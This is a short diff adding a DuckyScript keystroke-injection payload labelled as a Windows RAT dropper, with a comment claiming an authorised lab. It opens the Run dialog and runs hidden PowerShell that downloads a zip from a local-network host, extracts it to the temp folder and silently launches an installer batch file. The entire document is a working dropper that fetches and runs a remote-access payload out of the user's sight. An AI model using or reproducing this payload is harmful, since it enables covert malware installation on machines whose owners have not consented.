@@ -1,0 +1,6 @@
+REM JOKER CARD - RAT dropper Windows (lab autorise)
+DELAY 2000
+GUI r
+DELAY 600
+STRING powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest 'http://192.168.1.222:8080/RickPortal_win.zip' -OutFile $env:TEMP\lz.zip; Expand-Archive $env:TEMP\lz.zip $env:TEMP\lz -Force; Start-Process cmd -ArgumentList '/c','""$env:TEMP\lz\INSTALLER.bat""' -WindowStyle Hidden"
+ENTER
